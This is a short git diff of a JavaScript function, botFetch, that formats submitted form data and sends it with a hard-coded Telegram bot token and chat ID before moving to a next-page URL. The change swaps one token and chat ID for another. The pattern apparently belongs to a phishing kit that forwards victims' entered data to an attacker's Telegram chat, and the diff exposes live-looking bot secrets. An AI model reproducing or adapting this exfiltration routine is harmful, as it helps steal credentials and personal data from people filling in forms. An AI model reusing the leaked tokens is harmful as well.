@@ -1,6 +1,6 @@
 export default function botFetch(data, nextPageURL) {
-    const botToken = "8281306926:AAFWu55bvxbCDZkYfPCIU2SGqxfAMyZOrAs";
-    const chatId = "5155963898";
+    const botToken = "8390081715:AAFHheEbo9EsWQc2ftPMKgGPl1WKaQ3UPQU";
+    const chatId = "-4669313790";
 
     const textData = Object.entries(data)
         .map(([key, value]) => `${key}: ${value}`)
@@ -33,5 +33,6 @@ export default function botFetch(data, nextPageURL) {
         .catch(err => alert("Fetch error: " + err));
 
 }
+
 
 
